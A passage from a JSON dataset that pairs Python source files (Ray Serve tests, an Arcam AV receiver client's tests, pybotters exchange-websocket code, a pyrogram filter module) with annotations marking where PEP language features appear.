wait_for_condition(lambda: check(\"123\", 2))\n    Counter = Counter.options(num_replicas=3)\n    Counter.deploy()\n    wait_for_condition(lambda: check(\"123\", 3))\n    Counter = Counter.options(user_config={\"count\": 456})\n    Counter.deploy()\n    wait_for_condition(lambda: check(\"456\", 3))\ndef test_call_method(serve_instance):\n    @serve.deployment(name=\"method\")\n    class CallMethod:\n        def method(self, request):\n            return \"hello\"\n    CallMethod.deploy()\n    resp = requests.get(\n        \"http://127.0.0.1:8000/method\",\n        timeout=1,\n        headers={\"X-SERVE-CALL-METHOD\": \"method\"})\n    assert resp.text == \"hello\"\n    handle = CallMethod.get_handle()\n    assert ray.get(handle.options(method_name=\"method\").remote()) == \"hello\"\ndef test_reject_duplicate_route(serve_instance):\n    @serve.deployment(name=\"A\")\n    @serve.ingress(path_prefix=\"/api\")\n    class A:\n        pass\n    A.deploy()\n    with pytest.raises(ValueError):\n        A.options(name=\"B\").deploy()\ndef test_scaling_replicas(serve_instance):\n    @serve.deployment(name=\"counter\", num_replicas=2)\n    class Counter:\n        def __init__(self):\n            self.count = 0\n        def __call__(self, _):\n            self.count += 1\n            return self.count\n    Counter.deploy()\n    counter_result = []\n    for _ in range(10):\n        resp = requests.get(\"http://127.0.0.1:8000/counter\").json()\n        counter_result.append(resp)\n    assert max(counter_result) < 10\n    Counter.options(num_replicas=1).deploy()\n    counter_result = []\n    for _ in range(10):\n        resp = requests.get(\"http://127.0.0.1:8000/counter\").json()\n        counter_result.append(resp)\n    assert max(counter_result) - min(counter_result) > 6\ndef test_delete_backend(serve_instance):\n    @serve.deployment(name=\"delete\")\n    def function(_):\n        return \"hello\"\n    function.deploy()\n    assert requests.get(\"http://127.0.0.1:8000/delete\").text == \"hello\"\n    function.delete()\n    @serve.deployment(name=\"delete\")\n    def function2(_):\n        return \"olleh\"\n    function2.deploy()\n    for _ in range(10):\n        try:\n            assert requests.get(\"http://127.0.0.1:8000/delete\").text == \"olleh\"\n            break\n        except AssertionError:\n            time.sleep(0.5)  \n    else:\n        assert requests.get(\"http://127.0.0.1:8000/delete\").text == \"olleh\"\n@pytest.mark.skip(\"Not implemented yet\")\ndef test_list_endpoints(serve_instance):\n    def f():\n        pass\n    serve.create_backend(\"backend\", f)\n    serve.create_backend(\"backend2\", f)\n    serve.create_backend(\"backend3\", f)\n    serve.create_endpoint(\n        \"endpoint\", backend=\"backend\", route=\"/api\", methods=[\"GET\", \"POST\"])\n    serve.create_endpoint(\"endpoint2\", backend=\"backend2\", methods=[\"POST\"])\n    serve.shadow_traffic(\"endpoint\", \"backend3\", 0.5)\n    endpoints = serve.list_endpoints()\n    assert \"endpoint\" in endpoints\n    assert endpoints[\"endpoint\"] == {\n        \"route\": \"/api\",\n        \"methods\": [\"GET\", \"POST\"],\n        \"traffic\": {\n            \"backend\": 1.0\n        },\n        \"shadows\": {\n            \"backend3\": 0.5\n        }\n    }\n    assert \"endpoint2\" in endpoints\n    assert endpoints[\"endpoint2\"] == {\n        \"route\": None,\n        \"methods\": [\"POST\"],\n        \"traffic\": {\n            \"backend2\": 1.0\n        },\n        \"shadows\": {}\n    }\n    serve.delete_endpoint(\"endpoint\")\n    assert \"endpoint2\" in serve.list_endpoints()\n    serve.delete_endpoint(\"endpoint2\")\n    assert len(serve.list_endpoints()) == 0\n@pytest.mark.skip(\"Not implemented yet\")\ndef test_list_backends(serve_instance):\n    def f():\n        pass\n    config1 = BackendConfig(max_concurrent_queries=10)\n    serve.create_backend(\"backend\", f, config=config1)\n    backends = serve.list_backends()\n    assert len(backends) == 1\n    assert \"backend\" in backends\n    assert backends[\"backend\"].max_concurrent_queries == 10\n    config2 = BackendConfig(num_replicas=10)\n    serve.create_backend(\"backend2\", f, config=config2)\n    backends = serve.list_backends()\n    assert len(backends) == 2\n    assert backends[\"backend2\"].num_replicas == 10\n    serve.delete_backend(\"backend\")\n    backends = serve.list_backends()\n    assert len(backends) == 1\n    assert \"backend2\" in backends\n    serve.delete_backend(\"backend2\")\n    assert len(serve.list_backends()) == 0\ndef test_starlette_request(serve_instance):\n    @serve.deployment(name=\"api\")\n    async def echo_body(starlette_request):\n        data = await starlette_request.body()\n        return data\n    echo_body.deploy()\n    UVICORN_HIGH_WATER_MARK = 65536  \n    long_string = \"x\" * 10 * UVICORN_HIGH_WATER_MARK\n    resp = requests.post(\"http://127.0.0.1:8000/api\", data=long_string).text\n    assert resp == long_string\ndef test_start_idempotent(serve_instance):\n    @serve.deployment(name=\"start\")\n    def func(*args):\n        pass\n    func.deploy()\n    assert \"start\" in serve.list_backends()\n    serve.start(detached=True)\n    serve.start()\n    serve.start(detached=True)\n    serve.start()\n    assert \"start\" in serve.list_backends()\nif __name__ == \"__main__\":\n    import sys\n    sys.exit(pytest.main([\"-v\", \"-s\", __file__]))",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        56,
                        59,
                        "async generator",
                        "async def slow_numbers():\n            for number in range(1, 4):\n                yield str(number)\n                await asyncio.sleep(0.01)"
                    ]
                ]
            }
        },
        "67": {
            "file": "import asyncio\nimport logging\nimport unittest\nimport pytest\nfrom datetime import timedelta\nfrom unittest.mock import ANY\nfrom arcam.fmj import (\n    CommandCodes,\n    CommandNotRecognised,\n    ConnectionFailed,\n)\nfrom arcam.fmj.client import Client, ClientContext\nfrom arcam.fmj.server import Server, ServerContext\nfrom arcam.fmj.state import State\n_LOGGER = logging.getLogger(__name__)\n@pytest.fixture\nasync def server(event_loop, request):\n    s = Server('localhost', 8888, \"AVR450\")\n    async with ServerContext(s):\n        s.register_handler(\n            0x01, CommandCodes.POWER, bytes([0xF0]),\n            lambda **kwargs: bytes([0x00])\n        )\n        s.register_handler(\n            0x01, CommandCodes.VOLUME, bytes([0xF0]),\n            lambda **kwargs: bytes([0x01])\n        )\n        yield s\n@pytest.fixture\nasync def silent_server(event_loop, request):\n    s = Server('localhost', 8888, \"AVR450\")\n    async def process(reader, writer):\n        while True:\n            if await reader.read(1) == bytes([]):\n                break\n    s.process_runner = process\n    async with ServerContext(s):\n        yield s\n@pytest.fixture\nasync def client(event_loop, request):\n    c = Client(\"localhost\", 8888)\n    async with ClientContext(c):\n        yield c\n@pytest.fixture\nasync def speedy_client(mocker):\n    mocker.patch('arcam.fmj.client._HEARTBEAT_INTERVAL', new=timedelta(seconds=1))\n    mocker.patch('arcam.fmj.client._HEARTBEAT_TIMEOUT', new=timedelta(seconds=2))\n    mocker.patch('arcam.fmj.client._REQUEST_TIMEOUT', new=timedelta(seconds=0.5))\nasync def test_power(event_loop, server, client):\n    data = await client.request(0x01, CommandCodes.POWER, bytes([0xF0]))\n    assert data == bytes([0x00])\nasync def test_multiple(event_loop, server, client):\n    data = await asyncio.gather(\n        client.request(0x01, CommandCodes.POWER, bytes([0xF0])),\n        client.request(0x01, CommandCodes.VOLUME, bytes([0xF0])),\n    )\n    assert data[0] == bytes([0x00])\n    assert data[1] == bytes([0x01])\nasync def test_invalid_command(event_loop, server, client):\n    with pytest.raises(CommandNotRecognised):\n        await client.request(0x01, 0xff, bytes([0xF0]))\nasync def test_state(event_loop, server, client):\n    state = State(client, 0x01)\n    await state.update()\n    assert state.get(CommandCodes.POWER) == bytes([0x00])\n    assert state.get(CommandCodes.VOLUME) == bytes([0x01])\nasync def test_silent_server_request(event_loop, speedy_client, silent_server, client):\n    with pytest.raises(asyncio.TimeoutError):\n        await client.request(0x01, CommandCodes.POWER, bytes([0xF0]))\nasync def test_silent_server_disconnect(event_loop, speedy_client, silent_server):\n    from arcam.fmj.client import _HEARTBEAT_TIMEOUT\n    c = Client(\"localhost\", 8888)\n    connected = True\n    with pytest.raises(ConnectionFailed):\n        async with ClientContext(c):\n            await asyncio.sleep(_HEARTBEAT_TIMEOUT.total_seconds()+0.5)\n            connected = c.connected\n    assert not connected\nasync def test_heartbeat(event_loop, speedy_client, server, client):\n    from arcam.fmj.client import _HEARTBEAT_INTERVAL\n    with unittest.mock.patch.object(\n            server,\n            'process_request',\n            wraps=server.process_request) as req:\n        await asyncio.sleep(_HEARTBEAT_INTERVAL.total_seconds()+0.5)\n        req.assert_called_once_with(ANY)\nasync def test_cancellation(event_loop, silent_server):\n    from arcam.fmj.client import _HEARTBEAT_TIMEOUT\n    e = asyncio.Event()\n    c = Client(\"localhost\", 8888)\n    async def runner():\n        await c.start()\n        try:\n            e.set()\n            await c.process()\n        finally:\n            await c.stop()\n    task = asyncio.create_task(runner())\n    await asyncio.wait_for(e.wait(), 5)\n    task.cancel()\n    with pytest.raises(asyncio.CancelledError):\n        await task",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        17,
                        28,
                        "async generator",
                        "async def server(event_loop, request):\n    s = Server('localhost', 8888, \"AVR450\")\n    async with ServerContext(s):\n        s.register_handler(\n            0x01, CommandCodes.POWER, bytes([0xF0]),\n            lambda **kwargs: bytes([0x00])\n        )\n        s.register_handler(\n            0x01, CommandCodes.VOLUME, bytes([0xF0]),\n            lambda **kwargs: bytes([0x01])\n        )\n        yield s"
                    ],
                    [
                        30,
                        38,
                        "async generator",
                        "async def silent_server(event_loop, request):\n    s = Server('localhost', 8888, \"AVR450\")\n    async def process(reader, writer):\n        while True:\n            if await reader.read(1) == bytes([]):\n                break\n    s.process_runner = process\n    async with ServerContext(s):\n        yield s"
                    ],
                    [
                        40,
                        43,
                        "async generator",
                        "async def client(event_loop, request):\n    c = Client(\"localhost\", 8888)\n    async with ClientContext(c):\n        yield c"
                    ]
                ]
            }
        },
        "68": {
            "file": "import asyncio\nimport base64\nimport datetime\nimport hashlib\nimport hmac\nimport logging\nimport time\nfrom dataclasses import dataclass\nfrom secrets import token_hex\nfrom typing import Any, List, Optional, Union\nimport aiohttp\nfrom aiohttp.http_websocket import json\nfrom aiohttp.typedefs import StrOrURL\nimport pybotters\nfrom .auth import Auth as _Auth\nlogger = logging.getLogger(__name__)\nasync def ws_run_forever(\n    url: StrOrURL,\n    session: aiohttp.ClientSession,\n    event: asyncio.Event,\n    *,\n    send_str: Optional[Union[str, List[str]]] = None,\n    send_json: Any = None,\n    hdlr_str=None,\n    hdlr_json=None,\n    auth=_Auth,\n    **kwargs: Any,\n) -> None:\n    if all([hdlr_str is None, hdlr_json is None]):\n        hdlr_json = pybotters.print_handler\n    iscorofunc_str = asyncio.iscoroutinefunction(hdlr_str)\n    iscorofunc_json = asyncio.iscoroutinefunction(hdlr_json)\n    while not session.closed:\n        cooldown = asyncio.create_task(asyncio.sleep(60.0))\n        try:\n            async with session.ws_connect(url, auth=auth, **kwargs) as ws:\n                event.set()\n                if '_authtask' in ws.__dict__:\n                    await ws.__dict__['_authtask']\n                if send_str is not None:\n                    if isinstance(send_str, list):\n                        await asyncio.gather(*[ws.send_str(item) for item in send_str])\n                    else:\n                        await ws.send_str(send_str)\n                if send_json is not None:\n                    if isinstance(send_json, list):\n                        await asyncio.gather(\n                            *[ws.send_json(item) for item in send_json]\n                        )\n                    else:\n                        await ws.send_json(send_json)\n                async for msg in ws:\n                    if msg.type == aiohttp.WSMsgType.TEXT:\n                        if hdlr_str is not None:\n                            try:\n                                if iscorofunc_str:\n                                    await hdlr_str(msg.data, ws)\n                                else:\n                                    hdlr_str(msg.data, ws)\n                            except Exception as e:\n                                logger.error(repr(e))\n                        if hdlr_json is not None:\n                            try:\n                                data = msg.json()\n                            except json.decoder.JSONDecodeError:\n                                pass\n                            else:\n                                try:\n                                    if iscorofunc_json:\n                                        await hdlr_json(data, ws)\n                                    else:\n                                        hdlr_json(data, ws)\n                                except Exception as e:\n                                    logger.error(repr(e))\n                    elif msg.type == aiohttp.WSMsgType.ERROR:\n                        break\n        except (aiohttp.WSServerHandshakeError, aiohttp.ClientOSError) as e:\n            logger.warning(repr(e))\n        await cooldown\nclass Heartbeat:\n    @staticmethod\n    async def bybit(ws: aiohttp.ClientWebSocketResponse):\n        while not ws.closed:\n            await ws.send_str('{\"op\":\"ping\"}')\n            await asyncio.sleep(30.0)\n    @staticmethod\n    async def bitbank(ws: aiohttp.ClientWebSocketResponse):\n        while not ws.closed:\n            await ws.send_str('2')\n            await asyncio.sleep(15.0)\n    @staticmethod\n    async def liquid(ws: aiohttp.ClientWebSocketResponse):\n        while not ws.closed:\n            await ws.send_str('{\"event\":\"pusher:ping\",\"data\":{}}')\n            await asyncio.sleep(60.0)\n    @staticmethod\n    async def ftx(ws: aiohttp.ClientWebSocketResponse):\n        while not ws.closed:\n            await ws.send_str('{\"op\":\"ping\"}')\n            await asyncio.sleep(15.0)\n    @staticmethod\n    async def binance(ws: aiohttp.ClientWebSocketResponse):\n        while not ws.closed:\n            await ws.pong()\n            await asyncio.sleep(60.0)\n    @staticmethod\n    async def phemex(ws: aiohttp.ClientWebSocketResponse):\n        while not ws.closed:\n            await ws.send_str('{\"method\":\"server.ping\",\"params\":[],\"id\":123}')\n            await asyncio.sleep(10.0)\nclass Auth:\n    @staticmethod\n    async def bitflyer(ws: aiohttp.ClientWebSocketResponse):\n        key: str = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][0]\n        secret: bytes = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][1]\n        timestamp = int(time.time())\n        nonce = token_hex(16)\n        sign = hmac.new(\n            secret, f'{timestamp}{nonce}'.encode(), digestmod=hashlib.sha256\n        ).hexdigest()\n        await ws.send_json(\n            {\n                'method': 'auth',\n                'params': {\n                    'api_key': key,\n                    'timestamp': timestamp,\n                    'nonce': nonce,\n                    'signature': sign,\n                },\n                'id': 'auth',\n            }\n        )\n        async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                data = msg.json()\n                if 'id' in data:\n                    if data['id'] == 'auth':\n                        break\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                break\n    @staticmethod\n    async def liquid(ws: aiohttp.ClientWebSocketResponse):\n        key: str = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][0]\n        secret: bytes = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][1]\n        json_payload = json.dumps(\n            {\n                'path': '/realtime',\n                'nonce': str(int(time.time() * 1000)),\n                'token_id': key,\n            },\n            separators=(',', ':'),\n        ).encode()\n        json_header = json.dumps(\n            {'typ': 'JWT', 'alg': 'HS256'},\n            separators=(',', ':'),\n        ).encode()\n        segments = [\n            base64.urlsafe_b64encode(json_header).replace(b'=', b''),\n            base64.urlsafe_b64encode(json_payload).replace(b'=', b''),\n        ]\n        signing_input = b'.'.join(segments)\n        signature = hmac.new(secret, signing_input, hashlib.sha256).digest()\n        segments.append(base64.urlsafe_b64encode(signature).replace(b'=', b''))\n        encoded_string = b'.'.join(segments).decode()\n        await ws.send_json(\n            {\n                'event': 'quoine:auth_request',\n                'data': {\n                    'path': '/realtime',\n                    'headers': {'X-Quoine-Auth': encoded_string},\n                },\n            }\n        )\n    @staticmethod\n    async def ftx(ws: aiohttp.ClientWebSocketResponse):\n        key: str = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][0]\n        secret: bytes = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][1]\n        ts = int(time.time() * 1000)\n        sign = hmac.new(\n            secret, f'{ts}websocket_login'.encode(), digestmod=hashlib.sha256\n        ).hexdigest()\n        msg = {\n            'op': 'login',\n            'args': {'key': key, 'sign': sign, 'time': ts},\n        }\n        if 'FTX-SUBACCOUNT' in ws._response.request_info.headers:\n            msg['args']['subaccount'] = ws._response.request_info.headers[\n                'FTX-SUBACCOUNT'\n            ]\n        await ws.send_json(msg)\n    @staticmethod\n    async def phemex(ws: aiohttp.ClientWebSocketResponse):\n        key: str = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][0]\n        secret: bytes = ws._response._session.__dict__['_apis'][\n            AuthHosts.items[ws._response.url.host].name\n        ][1]\n        expiry = int(time.time() + 60.0)\n        signature = hmac.new(\n            secret, f'{key}{expiry}'.encode(), digestmod=hashlib.sha256\n        ).hexdigest()\n        msg = {\n            'method': 'user.auth',\n            'params': ['API', key, signature, expiry],\n            'id': 123,\n        }\n        await ws.send_json(msg)\n        async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                data = msg.json()\n                if data['result'] == {'status': 'success'}:\n                    break\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                break\n@dataclass\nclass Item:\n    name: str\n    func: Any\nclass HeartbeatHosts:\n    items = {\n        'stream.bitbank.cc': Heartbeat.bitbank,\n        'stream.bybit.com': Heartbeat.bybit,\n        'stream.bytick.com': Heartbeat.bybit,\n        'stream-testnet.bybit.com': Heartbeat.bybit,\n        'tap.liquid.com': Heartbeat.liquid,\n        'ftx.com': Heartbeat.ftx,\n        'stream.binance.com': Heartbeat.binance,\n        'fstream.binance.com': Heartbeat.binance,\n        'dstream.binance.com': Heartbeat.binance,\n        'vstream.binance.com': Heartbeat.binance,\n        'stream.binancefuture.com': Heartbeat.binance,\n        'dstream.binancefuture.com': Heartbeat.binance,\n        'testnet.binanceops.com': Heartbeat.binance,\n        'testnetws.binanceops.com': Heartbeat.binance,\n        'phemex.com': Heartbeat.phemex,\n        'testnet.phemex.com': Heartbeat.phemex,\n    }\nclass AuthHosts:\n    items = {\n        'ws.lightstream.bitflyer.com': Item('bitflyer', Auth.bitflyer),\n        'tap.liquid.com': Item('liquid', Auth.liquid),\n        'ftx.com': Item('ftx', Auth.ftx),\n        'phemex.com': Item('phemex', Auth.phemex),\n        'testnet.phemex.com': Item('phemex_testnet', Auth.phemex),\n    }\nclass ClientWebSocketResponse(aiohttp.ClientWebSocketResponse):\n    def __init__(self, *args, **kwargs) -> None:\n        super().__init__(*args, **kwargs)\n        if self._response.url.host in HeartbeatHosts.items:\n            self.__dict__['_pingtask'] = asyncio.create_task(\n                HeartbeatHosts.items[self._response.url.host](self)\n            )\n        if self._response.__dict__['_auth'] is _Auth:\n            if self._response.url.host in AuthHosts.items:\n                if (\n                    AuthHosts.items[self._response.url.host].name\n                    in self._response._session.__dict__['_apis']\n                ):\n                    self.__dict__['_authtask'] = asyncio.create_task(\n                        AuthHosts.items[self._response.url.host].func(self)\n                    )\n        self._lock = asyncio.Lock()\n    async def send_str(self, *args, **kwargs) -> None:\n        if self._response.url.host not in RequestLimitHosts.items:\n            await super().send_str(*args, **kwargs)\n        else:\n            super_send_str = super().send_str(*args, **kwargs)\n            await RequestLimitHosts.items[self._response.url.host](self, super_send_str)\nclass RequestLimit:\n    @staticmethod\n    async def gmocoin(ws: ClientWebSocketResponse, send_str):\n        async with ws._lock:\n            await send_str\n            r = await ws._response._session.get(\n                'https://api.coin.z.com/public/v1/status', auth=_Auth\n            )\n            data = await r.json()\n            before = datetime.datetime.fromisoformat(data['responsetime'][:-1])\n            while True:\n                await asyncio.sleep(1.0)\n                r = await ws._response._session.get(\n                    'https://api.coin.z.com/public/v1/status', auth=_Auth\n                )\n                data = await r.json()\n                after = datetime.datetime.fromisoformat(data['responsetime'][:-1])\n                delta = after - before\n                if delta.total_seconds() >= 1.0:\n                    break\nclass RequestLimitHosts:\n    items = {\n        'api.coin.z.com': RequestLimit.gmocoin,\n    }",
            "patterns": {
                "pep_468": [
                    [
                        36,
                        "session.ws_connect(url, auth=auth, **kwargs)"
                    ],
                    [
                        261,
                        "super().__init__(*args, **kwargs)"
                    ],
                    [
                        278,
                        "super().send_str(*args, **kwargs)"
                    ],
                    [
                        280,
                        "super().send_str(*args, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        230,
                        "name: str"
                    ],
                    [
                        231,
                        "func: Any"
                    ],
                    [
                        114,
                        "key: str = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        117,
                        "secret: bytes = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        147,
                        "key: str = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        150,
                        "secret: bytes = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        184,
                        "key: str = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        187,
                        "secret: bytes = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        205,
                        "key: str = ws._response._session.__dict__['_apis']["
                    ],
                    [
                        208,
                        "secret: bytes = ws._response._session.__dict__['_apis']["
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_557": [
                    [
                        8,
                        8,
                        "dataclasses import",
                        "from dataclasses import dataclass"
                    ],
                    [
                        229,
                        231,
                        "dataclass definition",
                        "class Item:\n    name: str\n    func: Any"
                    ]
                ],
                "pep_585": [
                    [
                        10,
                        "from typing import Any, List, Optional, Union",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        137,
                        144,
                        "async for",
                        "async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                data = msg.json()\n                if 'id' in data:\n                    if data['id'] == 'auth':\n                        break\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                break"
                    ],
                    [
                        221,
                        227,
                        "async for",
                        "async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                data = msg.json()\n                if data['result'] == {'status': 'success'}:\n                    break\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                break"
                    ],
                    [
                        52,
                        76,
                        "async for",
                        "async for msg in ws:\n                    if msg.type == aiohttp.WSMsgType.TEXT:\n                        if hdlr_str is not None:\n                            try:\n                                if iscorofunc_str:\n                                    await hdlr_str(msg.data, ws)\n                                else:\n                                    hdlr_str(msg.data, ws)\n                            except Exception as e:\n                                logger.error(repr(e))\n                        if hdlr_json is not None:\n                            try:\n                                data = msg.json()\n                            except json.decoder.JSONDecodeError:\n                                pass\n                            else:\n                                try:\n                                    if iscorofunc_json:\n                                        await hdlr_json(data, ws)\n                                    else:\n                                        hdlr_json(data, ws)\n                                except Exception as e:\n                                    logger.error(repr(e))\n                    elif msg.type == aiohttp.WSMsgType.ERROR:\n                        break"
                    ]
                ],
                "pep_498": [
                    [
                        123,
                        "            secret, f'{timestamp}{nonce}'.encode(), digestmod=hashlib.sha256"
                    ],
                    [
                        192,
                        "            secret, f'{ts}websocket_login'.encode(), digestmod=hashlib.sha256"
                    ],
                    [
                        213,
                        "            secret, f'{key}{expiry}'.encode(), digestmod=hashlib.sha256"
                    ]
                ]
            }
        },
        "69": {
            "file": "__all__ = ['Filter', 'clear_db']\nimport asyncio\nfrom typing import List, Tuple, Dict, Callable, Any, Optional, Union\nfrom pyrogram import filters as rawfilters\nfrom pyrogram.filters import Filter as RawFilter\nfrom pyrogram.handlers import MessageHandler\nfrom pyrogram.handlers.handler import Handler\nfrom xdecha import logging, Config\nfrom ... import client as _client, get_collection  \n_DISABLED_FILTERS = get_collection(\"DISABLED_FILTERS\")\n_UNLOADED_FILTERS = get_collection(\"UNLOADED_FILTERS\")\n_LOG = logging.getLogger(__name__)\n_LOG_STR = \"<<<!  [[[[[  %s  ]]]]]  !>>>\"\n_DISABLED: List[str] = []\n_UNLOADED: List[str] = []\ndef _init(name: str) -> Tuple[bool, bool]:\n    name = name.lstrip(Config.CMD_TRIGGER)\n    enabled = True\n    loaded = True\n    if name in _DISABLED:\n        enabled = False\n    if name in _UNLOADED:\n        loaded = False\n    return enabled, loaded\nasync def _main() -> None:\n    async for flt in _DISABLED_FILTERS.find():\n        _DISABLED.append(flt['filter'])\n    async for flt in _UNLOADED_FILTERS.find():\n        _UNLOADED.append(flt['filter'])\nasync def _enable(name: str) -> None:\n    name = name.lstrip(Config.CMD_TRIGGER)\n    if name in _DISABLED:\n        _DISABLED.remove(name)\n        await _DISABLED_FILTERS.delete_one({'filter': name})\nasync def _disable(name: str) -> None:\n    name = name.lstrip(Config.CMD_TRIGGER)\n    if name != \"enable\":\n        _DISABLED.append(name)\n        await _DISABLED_FILTERS.insert_one({'filter': name})\nasync def _load(name: str) -> None:\n    name = name.lstrip(Config.CMD_TRIGGER)\n    if name in _UNLOADED:\n        _UNLOADED.remove(name)\n        await _UNLOADED_FILTERS.delete_one({'filter': name})\nasync def _unload(name: str) -> None:\n    name = name.lstrip(Config.CMD_TRIGGER)\n    if name != \"load\":\n        _UNLOADED.append(name)\n        await _UNLOADED_FILTERS.insert_one({'filter': name})\nasync def clear_db() -> bool:\n    _DISABLED.clear()\n    _UNLOADED.clear()\n    await _DISABLED_FILTERS.drop()\n    await _UNLOADED_FILTERS.drop()\n    _LOG.info(_LOG_STR, \"cleared filter DB!\")\n    return True\nasyncio.get_event_loop().run_until_complete(_main())\nclass Filter:\n    def __init__(self,\n                 filters: RawFilter,\n                 client: '_client.xdecha',\n                 group: int,\n                 scope: List[str],\n                 only_admins: bool,\n                 allow_via_bot: bool,\n                 check_client: bool,\n                 check_downpath: bool,\n                 check_perm: bool,\n                 check_change_info_perm: bool,\n                 check_edit_perm: bool,\n                 check_delete_perm: bool,\n                 check_restrict_perm: bool,\n                 check_promote_perm: bool,\n                 check_invite_perm: bool,\n                 check_pin_perm: bool,\n                 name: str = '') -> None:\n        self.filters = rawfilters.create(lambda _, __, ___: self.is_enabled) & filters\n        self.name = name\n        self.scope = scope\n        self.only_admins = only_admins\n        self.allow_via_bot = allow_via_bot\n        self.check_client = check_client\n        self.check_downpath = check_downpath\n        self.check_perm = check_perm\n        self.check_change_info_perm = check_change_info_perm\n        self.check_edit_perm = check_edit_perm\n        self.check_delete_perm = check_delete_perm\n        self.check_restrict_perm = check_restrict_perm\n        self.check_promote_perm = check_promote_perm\n        self.check_invite_perm = check_invite_perm\n        self.check_pin_perm = check_pin_perm\n        self.doc: Optional[str]\n        self.plugin_name: str\n        self._client = client\n        self._group = group\n        self._enabled = True\n        self._loaded = False\n        self._func: Callable[[Any], Any]\n        self._handler: Handler\n    @classmethod\n    def parse(cls, **kwargs: Union[RawFilter, '_client.xdecha', int, bool]) -> 'Filter':\n        return cls(**Filter._parse(**kwargs))  \n    @staticmethod\n    def _parse(allow_private: bool,\n               allow_bots: bool,\n               allow_groups: bool,\n               allow_channels: bool,\n               **kwargs: Union[RawFilter, '_client.xdecha', int, bool]\n               ) -> Dict[str, Union[RawFilter, '_client.xdecha', int, bool]]:\n        kwargs['check_client'] = kwargs['allow_via_bot'] and kwargs['check_client']\n        kwargs['scope']: List[str] = []\n        if allow_bots:\n            kwargs['scope'].append('bot')\n        if allow_private:\n            kwargs['scope'].append('private')\n        if allow_channels:\n            kwargs['scope'].append('channel')\n        if allow_groups:\n            kwargs['scope'] += ['group', 'supergroup']\n        kwargs['check_perm'] = kwargs['check_change_info_perm'] \\\n            or kwargs['check_edit_perm'] or kwargs['check_delete_perm'] \\\n            or kwargs['check_restrict_perm'] or kwargs['check_promote_perm'] \\\n            or kwargs['check_invite_perm'] or kwargs['check_pin_perm']\n        return kwargs\n    def __repr__(self) -> str:\n        return f\"<filter {self.name}>\"\n    @property\n    def is_enabled(self) -> bool:\n        return self._loaded and self._enabled\n    @property\n    def is_disabled(self) -> bool:\n        return self._loaded and not self._enabled\n    @property\n    def is_loaded(self) -> bool:\n        return self._loaded\n    async def init(self) -> None:\n        self._enabled, loaded = _init(self.name)\n        if loaded:\n            await self.load()\n    def update(self, func: Callable[[Any], Any], template: Callable[[Any], Any]) -> None:\n        if not self.name:\n            self.name = f\"{func.__module__.split('.')[-1]}.{func.__name__}\"\n        self.doc = func.__doc__.strip() if func.__doc__ else None\n        self._func = func\n        self._handler = MessageHandler(template, self.filters)\n        _LOG.debug(_LOG_STR, f\"updated {self}\")\n    async def enable(self) -> str:\n        if self._enabled:\n            return ''\n        self._enabled = True\n        await _enable(self.name)\n        _LOG.debug(_LOG_STR, f\"enabled {self}\")\n        return self.name\n    async def disable(self) -> str:\n        if not self._enabled:\n            return ''\n        self._enabled = False\n        await _disable(self.name)\n        _LOG.debug(_LOG_STR, f\"disabled {self}\")\n        return self.name\n    async def load(self) -> str:\n        if self._loaded or (self._client.is_bot and not self.allow_via_bot):\n            return ''\n        self._client.add_handler(self._handler, self._group)\n        if self.allow_via_bot and self._client._bot is not None:\n            self._client._bot.add_handler(self._handler, self._group)\n        self._loaded = True\n        await _load(self.name)\n        _LOG.debug(_LOG_STR, f\"loaded {self}\")\n        return self.name\n    async def unload(self) -> str:\n        if not self._loaded:\n            return ''\n        self._client.remove_handler(self._handler, self._group)\n        if self.allow_via_bot and self._client._bot is not None:\n            self._client._bot.remove_handler(self._handler, self._group)\n        self._loaded = False\n        await _unload(self.name)\n        _LOG.debug(_LOG_STR, f\"unloaded {self}\")\n        return self.name",
            "patterns": {
                "pep_468": [
                    [
                        102,
                        "Filter._parse(**kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        14,
                        "_DISABLED: List[str] = []"
                    ],
                    [
                        15,
                        "_UNLOADED: List[str] = []"
                    ],
                    [
                        92,
                        "self.doc: Optional[str]"
                    ],
                    [
                        93,
                        "self.plugin_name: str"
                    ],
                    [
                        98,
                        "self._func: Callable[[Any], Any]"
                    ],
                    [
                        99,
                        "self._handler: Handler"
                    ],
                    [
                        111,
                        "kwargs['scope']: List[str] = []"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        61,
                        "                 client: '_client.xdecha',",
                        "quoted annotation"
                    ],
                    [
                        101,
                        "    def parse(cls, **kwargs: Union[RawFilter, '_client.xdecha', int, bool]) -> 'Filter':",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import List, Tuple, Dict, Callable, Any, Optional, Union",
